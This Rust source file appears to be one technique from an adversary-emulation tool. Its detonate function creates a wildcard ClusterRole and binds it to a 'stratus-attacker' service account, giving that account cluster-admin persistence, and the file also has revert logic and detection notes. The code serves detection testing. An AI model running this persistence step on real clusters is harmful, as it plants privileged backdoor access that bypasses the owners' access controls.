use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use k8s_openapi::api::rbac::v1::{ClusterRole, ClusterRoleBinding, PolicyRule, RoleRef, Subject};
use k8s_openapi::apimachinery::pkg::apis::meta::v1::ObjectMeta;
use kube::{Api, Client};

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const CLUSTERROLE_NAME: &str = "stratus-red-team-admin";
const CLUSTERROLEBINDING_NAME: &str = "stratus-red-team-admin-binding";
const TARGET_SA: &str = "stratus-attacker";
const TARGET_NS: &str = "default";

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set.", e))?;

    let cr_api: Api<ClusterRole> = Api::all(client.clone());
    let crb_api: Api<ClusterRoleBinding> = Api::all(client.clone());

    // Create ClusterRole with all permissions
    let cluster_role = ClusterRole {
        metadata: ObjectMeta {
            name: Some(CLUSTERROLE_NAME.to_string()),
            ..Default::default()
        },
        rules: Some(vec![PolicyRule {
            api_groups: Some(vec!["*".to_string()]),
            resources: Some(vec!["*".to_string()]),
            verbs: vec!["*".to_string()],
            ..Default::default()
        }]),
        ..Default::default()
    };

    cr_api
        .create(&Default::default(), &cluster_role)
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create ClusterRole: {}", e))?;

    println!("Created ClusterRole '{}'", CLUSTERROLE_NAME);

    // Create ClusterRoleBinding granting the role to a test service account
    let crb = ClusterRoleBinding {
        metadata: ObjectMeta {
            name: Some(CLUSTERROLEBINDING_NAME.to_string()),
            ..Default::default()
        },
        role_ref: RoleRef {
            api_group: "rbac.authorization.k8s.io".to_string(),
            kind: "ClusterRole".to_string(),
            name: CLUSTERROLE_NAME.to_string(),
        },
        subjects: Some(vec![Subject {
            kind: "ServiceAccount".to_string(),
            name: TARGET_SA.to_string(),
            namespace: Some(TARGET_NS.to_string()),
            ..Default::default()
        }]),
    };

    crb_api
        .create(&Default::default(), &crb)
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create ClusterRoleBinding: {}", e))?;

    println!(
        "Created ClusterRoleBinding '{}' — service account '{}/{}' now has cluster-admin equivalent access",
        CLUSTERROLEBINDING_NAME, TARGET_NS, TARGET_SA
    );

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}", e))?;

    let cr_api: Api<ClusterRole> = Api::all(client.clone());
    let crb_api: Api<ClusterRoleBinding> = Api::all(client.clone());

    // Delete CRB first, then CR
    if let Err(e) = crb_api
        .delete(CLUSTERROLEBINDING_NAME, &Default::default())
        .await
    {
        eprintln!("Warning: failed to delete ClusterRoleBinding: {}", e);
    } else {
        println!("Deleted ClusterRoleBinding '{}'", CLUSTERROLEBINDING_NAME);
    }

    if let Err(e) = cr_api
        .delete(CLUSTERROLE_NAME, &Default::default())
        .await
    {
        eprintln!("Warning: failed to delete ClusterRole: {}", e);
    } else {
        println!("Deleted ClusterRole '{}'", CLUSTERROLE_NAME);
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.persistence.create-admin-clusterrole",
        friendly_name: "Create Cluster-Admin ClusterRole and Binding",
        description: "Creates a wildcard ClusterRole granting all permissions and a ClusterRoleBinding assigning it to a service account, establishing privileged persistent access in the cluster.",
        detection: "Kubernetes audit log: create clusterroles/clusterrolebindings with wildcard permissions by unexpected identity. Falco: Cluster-admin binding created.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
